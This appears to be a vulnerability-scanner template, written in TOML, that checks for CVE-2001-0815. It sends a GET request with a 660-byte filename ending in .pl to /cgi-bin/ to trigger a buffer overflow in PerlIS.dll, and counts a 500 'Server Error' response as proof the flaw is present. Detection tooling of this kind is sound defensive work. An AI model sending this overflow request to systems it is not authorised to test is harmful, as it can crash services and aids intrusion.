[info]
author = "ave"
description = "向目标Web服务器的/cgi-bin/路径发送包含超长文件名（660字节）的HTTP GET请求，请求以.pl扩展名结尾，触发PerlIS.dll缓冲区溢出。若服务器返回500 Server Error响应，则表明目标存在该漏洞。"
id = "POC-AVE-2001-0366"
name = "CVE-2001-0815 PoC"
severity = "high"
tags = ["ave-2001-0366"]
vuln_id = [
    "CVE-2001-0815",
    "AVE-2001-0366",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin/{{crap}}660C.pl"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = true
status = [500]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["Server Error"]
